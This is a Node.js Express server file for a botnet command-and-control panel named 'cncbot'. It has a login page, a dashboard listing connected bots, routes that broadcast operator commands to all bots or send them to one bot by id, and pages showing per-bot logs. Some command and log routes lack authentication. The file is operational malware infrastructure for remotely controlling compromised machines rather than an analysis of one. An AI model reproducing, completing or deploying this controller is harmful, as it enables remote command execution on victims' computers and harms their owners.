var express = require('express');
var path = require('path');
var favicon = require('serve-favicon');
var logger = require('morgan');
var cookieParser = require('cookie-parser');
var session = require('express-session');
var bodyParser = require('body-parser');
var uuid = require('uuid-v4');

var debug = require('debug')('cncbot:server');
var http = require('http');

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

// uncomment after placing your favicon in /public
//app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname + '/node_modules'));
app.use(session({name: 'MHBOTTOKEN', secret: uuid()}));


    var port = normalizePort(process.env.PORT || '3000');
    app.set('port', port);
    var server = http.createServer(app);
    /**
     * Listen on provided port, on all network interfaces.
     */
    server.listen(port);
    server.on('error', onError);
    server.on('listening', onListening);
    var Websocketserver=require('./Websocketserver')(server);
    var BotSocketServer=require('./BotSocketServer')(Websocketserver);
var auth = require('./auth');

app.get('/', function(req, res, next) {
    if (auth.isAuthenticated(req,res)) res.redirect('/index');
    res.render('login');
});
app.post('/login',function (req,res,next) {
    auth.login(req,res);
    res.redirect('/');
});
app.get('/index', auth.requireToken,function (req,res,next) {
    res.render('index1');
});

app.post('/index-cmd', auth.requireToken,function (req,res) {
    console.log(req.body);
    let cmd = req.body.cmd;
    BotSocketServer.broadcastCmd(cmd);
});
app.get('/logout', auth.requireToken,function (req,res,next) {
    auth.logout(req,res);
    res.render('login');
});
app.get('/charts', auth.requireToken,function (req,res,next) {
    res.render('charts');
});
app.get('/tables', auth.requireToken,function (req,res,next) {
    BotSocketServer.getAllConnections(function (callback) {
        res.render('tables',{
            connections: callback
        });
        console.log(JSON.stringify(callback));
    });

});
app.get('/logout', auth.requireToken,function (req,res,next) {
    res.render('login');
});
app.get('/command/:id', auth.requireToken,function(req,res,next){
    BotSocketServer.getConnectionById(req.params.id,function (connection) {
        console.log(JSON.stringify(connection)+'selam control merhaba');
        if(connection!=null){
            res.render('Command',{
                connection : connection
            });
        }else {
            res.redirect('/index');
        }
    });

});
app.post('/command/:id/cmd/',function(req,res,next){
    let id = req.params.id;
    let cmd = req.body.cmd;
    console.log(cmd);
    BotSocketServer.sendCmd(id,cmd);
    res.status(200).send({'status':'ok'})
});
app.get('/logs',function (req,res,next) {
BotSocketServer.GetAllLogs(function (callback) {
    res.render('log',{logs:callback})
});

});
app.get('/logs/:id',function (req,res,next) {
    let id = req.params.id;
    BotSocketServer.GetUserLogs(id, function (logs) {
        console.log(logs);
        res.render('log', {logs: logs});
    });
});
// catch 404 and forward to error handler
app.use(function(req, res, next) {
    var err = new Error('Not Found');
    err.status = 404;
    next(err);
});

// error handler
app.use(function(err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};
    // render the error page
    res.status(err.status || 500);
    res.render('error');
});
function normalizePort(val) {
        var port = parseInt(val, 10);

        if (isNaN(port)) {
            // named pipe
            return val;
        }

        if (port >= 0) {
            // port number
            return port;
        }

        return false;
    }
    function onError(error) {
        if (error.syscall !== 'listen') {
            throw error;
        }

        var bind = typeof port === 'string'
            ? 'Pipe ' + port
            : 'Port ' + port;

        // handle specific listen errors with friendly messages
        switch (error.code) {
            case 'EACCES':
                console.error(bind + ' requires elevated privileges');
                process.exit(1);
                break;
            case 'EADDRINUSE':
                console.error(bind + ' is already in use');
                process.exit(1);
                break;
            default:
                throw error;
        }
    }
    function onListening() {
        var addr = server.address();
        var bind = typeof addr === 'string'
            ? 'pipe ' + addr
            : 'port ' + addr.port;
        debug('Listening on ' + bind);
    }


